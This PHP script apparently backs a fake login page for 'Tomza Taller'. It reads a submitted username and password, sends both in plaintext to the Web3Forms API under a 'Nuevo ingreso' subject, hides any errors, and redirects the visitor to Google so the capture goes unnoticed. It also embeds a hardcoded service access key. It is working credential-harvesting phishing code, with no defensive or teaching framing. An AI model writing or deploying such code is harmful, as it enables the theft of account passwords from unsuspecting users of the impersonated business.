<?php
// Evitar acceso directo
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

// Recibir y limpiar los datos
$usuario = trim($_POST["usuario"] ?? "");
$password = trim($_POST["password"] ?? "");

// Validar que no estén vacíos
if ($usuario === "" || $password === "") {
    die("Faltan datos.");
}

// Tu clave de Web3Forms
$access_key = "bafc5339-b2a5-4e5b-bad7-a4d93a053174";

// Datos que se enviarán
$datos = [
    "access_key" => $access_key,
    "subject" => "Nuevo ingreso - Tomza Taller",
    "Usuario" => $usuario,
    "Contraseña" => $password,
    "Fecha y hora" => date("d/m/Y H:i:s")
];

// Configuración de envío
$opciones = [
    "http" => [
        "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
        "method" => "POST",
        "content" => http_build_query($datos),
        "timeout" => 10
    ]
];

// Enviar
@file_get_contents("https://api.web3forms.com/submit", false, stream_context_create($opciones));

// Redirigir a Google
header("Location: https://www.google.com");
exit;
?>
